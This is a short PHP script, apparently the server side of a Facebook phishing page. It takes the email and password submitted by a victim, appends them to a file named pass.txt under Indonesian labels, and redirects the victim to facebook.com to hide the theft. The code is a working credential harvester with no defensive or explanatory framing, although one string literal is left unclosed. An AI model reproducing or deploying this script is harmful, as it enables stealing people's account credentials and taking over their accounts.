header("Location: http://facebook.com");
$ADEx = "pass.txt;
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "Email atau Telepon :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "+++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
